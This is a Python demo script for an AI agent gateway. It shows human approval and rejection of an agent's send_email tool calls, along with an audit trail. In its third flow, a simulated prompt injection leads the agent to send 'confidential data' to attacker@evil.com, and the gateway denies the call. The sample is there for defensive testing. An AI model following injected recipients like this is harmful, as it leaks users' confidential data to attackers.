"""
approval_flow_example.py — End-to-end approval workflow demonstration.

This example demonstrates the full approval lifecycle:

    1. Agent sends a tool request → gateway returns ask + approval_id
    2. Human reviewer inspects the pending approval
    3. Reviewer approves → gateway executes the tool, returns result
    4. Full audit trail visible in GET /traces

A second flow demonstrates rejection:

    1. Agent sends another request → ask + different approval_id
    2. Reviewer rejects → gateway returns deny-like response
    3. Trace shows original_verdict=ask, final_verdict=deny

Usage:
    # Terminal 1 — start the gateway
    python scripts/run_gateway.py

    # Terminal 2 — run this example
    python examples/integrations/approval_flow_example.py

If no running gateway is found, this script starts one in a background
thread automatically.
"""

from __future__ import annotations

import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from agent_hypervisor.gateway_client import GatewayClient, GatewayError, arg


# ---------------------------------------------------------------------------
# Demo flows
# ---------------------------------------------------------------------------

def _section(title: str) -> None:
    print(f"\n{'─' * 64}")
    print(f"  {title}")
    print(f"{'─' * 64}")


def flow_approve(client: GatewayClient) -> None:
    """Flow 1: request → ask → approve → execute."""
    _section("Flow 1: Request → ASK → Approve → Execute")

    # Step 1: Send a request that will produce ask
    print("\n[Step 1] Agent sends send_email with user_declared recipient")
    response = client.execute_tool(
        tool="send_email",
        arguments={
            "to":      arg("alice@company.com", "user_declared",
                           role="recipient_source"),
            "subject": arg("Q3 Financial Summary",   "system"),
            "body":    arg("Please see the attached report.", "system"),
        },
        call_id="flow1-req1",
    )
    print(f"         verdict: {response['verdict']}")
    print(f"         reason:  {response['reason']}")

    if response["verdict"] != "ask":
        print("         (expected ask — skipping approval flow)")
        return

    approval_id = response["approval_id"]
    print(f"         approval_id: {approval_id}")

    # Step 2: Reviewer inspects the pending approval
    print("\n[Step 2] Reviewer fetches the pending approval record")
    record = client.get_approval(approval_id)
    print(f"         tool:          {record['tool']}")
    print(f"         status:        {record['status']}")
    print(f"         reason:        {record['reason']}")
    print(f"         matched_rule:  {record['matched_rule']}")
    print(f"         created_at:    {record['created_at']}")
    print(f"         arg_provenance:")
    for k, v in record["arg_provenance"].items():
        print(f"           {k}: {v}")

    # Step 3: List all pending approvals
    print("\n[Step 3] Gateway lists all pending approvals")
    pending = client.get_approvals(status="pending")
    print(f"         {len(pending)} pending approval(s)")
    for p in pending:
        print(f"           [{p['approval_id']}] {p['tool']} — {p['reason'][:60]}")

    # Step 4: Reviewer approves
    print(f"\n[Step 4] Reviewer approves (actor=alice-reviewer)")
    final = client.submit_approval(approval_id, approved=True, actor="alice-reviewer")
    print(f"         verdict:      {final['verdict']}")
    print(f"         matched_rule: {final['matched_rule']}")
    if final.get("result"):
        print(f"         result:       {final['result']}")

    # Step 5: Verify the approval record is now "executed"
    print("\n[Step 5] Verify approval is marked as executed")
    record_after = client.get_approval(approval_id)
    print(f"         status:      {record_after['status']}")
    print(f"         actor:       {record_after['actor']}")
    print(f"         resolved_at: {record_after['resolved_at']}")


def flow_reject(client: GatewayClient) -> None:
    """Flow 2: request → ask → reject → deny."""
    _section("Flow 2: Request → ASK → Reject → Deny")

    # Step 1: Send another request
    print("\n[Step 1] Agent sends send_email (different call)")
    response = client.execute_tool(
        tool="send_email",
        arguments={
            "to":      arg("bob@company.com", "user_declared",
                           role="recipient_source"),
            "subject": arg("Budget Report — Confidential", "system"),
            "body":    arg("Attached is the budget summary.", "system"),
        },
        call_id="flow2-req1",
    )
    print(f"         verdict: {response['verdict']}")

    if response["verdict"] != "ask":
        print("         (expected ask — skipping rejection flow)")
        return

    approval_id = response["approval_id"]
    print(f"         approval_id: {approval_id}")

    # Step 2: Reviewer rejects
    print(f"\n[Step 2] Reviewer REJECTS (actor=security-team)")
    final = client.submit_approval(approval_id, approved=False, actor="security-team")
    print(f"         verdict:      {final['verdict']}")
    print(f"         reason:       {final['reason']}")
    print(f"         matched_rule: {final['matched_rule']}")

    # Step 3: Verify rejection is recorded
    print("\n[Step 3] Verify approval is marked as rejected")
    record_after = client.get_approval(approval_id)
    print(f"         status:      {record_after['status']}")
    print(f"         actor:       {record_after['actor']}")

    # Step 4: Confirm double-resolve is blocked
    print("\n[Step 4] Confirm that a second approval attempt is rejected (409)")
    try:
        client.submit_approval(approval_id, approved=True, actor="alice")
        print("         ERROR: expected 409 but got no error")
    except GatewayError as exc:
        if exc.status == 409:
            print(f"         ✓ Correctly rejected with 409: {exc.detail}")
        else:
            print(f"         Unexpected error {exc.status}: {exc.detail}")


def flow_malicious(client: GatewayClient) -> None:
    """Flow 3: request with external_document provenance → deny (no approval created)."""
    _section("Flow 3: Malicious Request → DENY (no approval needed)")

    print("\n[Step 1] Agent sends send_email with recipient from external document")
    print("         (simulates prompt injection: attacker embedded email in a doc)")
    response = client.execute_tool(
        tool="send_email",
        arguments={
            "to":      arg("attacker@evil.com", "external_document",
                           label="injected_report.txt"),
            "subject": arg("Stolen Data", "system"),
            "body":    arg("Here is the confidential data.", "system"),
        },
        call_id="flow3-req1",
    )
    print(f"         verdict:      {response['verdict']}")
    print(f"         reason:       {response['reason']}")
    print(f"         matched_rule: {response['matched_rule']}")
    assert response["verdict"] == "deny", "Expected deny for external_document recipient"
    print("         ✓ Correctly denied — no approval record created")

    # Verify no pending approval was created
    pending = client.get_approvals(status="pending")
    flow3_approvals = [p for p in pending if "flow3" in p.get("call_id", "")]
    assert not flow3_approvals, "Unexpected pending approval for denied request"
    print("         ✓ No pending approval record for this request")


def show_audit_trail(client: GatewayClient) -> None:
    """Show the full trace log after all flows complete."""
    _section("Audit Trail — Full Trace Log")

    traces = client.get_traces(limit=20)
    print(f"\n  {len(traces)} trace entries (newest first):\n")
    print(f"  {'trace_id':10s} {'tool':12s} {'verdict':6s} {'rule':38s} {'approval':10s}")
    print(f"  {'-'*10} {'-'*12} {'-'*6} {'-'*38} {'-'*10}")
    for t in traces:
        appr = t.get("approval_id") or ""
        status = t.get("approval_status") or ""
        appr_col = f"{appr[:6]}:{status[:4]}" if appr else ""
        verdict = t["final_verdict"]
        orig = t.get("original_verdict")
        if orig and orig != verdict:
            verdict = f"{orig}→{verdict}"
        print(f"  {t['trace_id']:10s} {t['tool']:12s} {verdict:6s} "
              f"{t['matched_rule'][:38]:38s} {appr_col:10s}")


# ---------------------------------------------------------------------------
# Self-contained runner
# ---------------------------------------------------------------------------

def _start_gateway_thread(config_path: str) -> None:
    import uvicorn
    from agent_hypervisor.gateway.gateway_server import create_app
    app = create_app(config_path)
    uvicorn.run(app, host="127.0.0.1", port=8082, log_level="warning")


def main() -> None:
    gateway_url = "http://127.0.0.1:8082"
    config_path = str(Path(__file__).parent.parent.parent / "gateway_config.yaml")

    client = GatewayClient(gateway_url, timeout=2)
    try:
        client.status()
        print(f"Connected to existing gateway at {gateway_url}")
    except GatewayError:
        print(f"Starting gateway in background thread…")
        t = threading.Thread(target=_start_gateway_thread, args=(config_path,), daemon=True)
        t.start()
        time.sleep(1.5)
        print(f"Gateway started at {gateway_url}")

    client = GatewayClient(gateway_url, timeout=10)

    print("\n" + "=" * 64)
    print("  Agent Hypervisor — Approval Workflow Demo")
    print("=" * 64)

    flow_malicious(client)   # deny — no approval
    flow_approve(client)     # ask → approve → execute
    flow_reject(client)      # ask → reject → deny
    show_audit_trail(client)

    print("\n" + "=" * 64)
    print("  Demo complete.")
    print("=" * 64 + "\n")


if __name__ == "__main__":
    main()
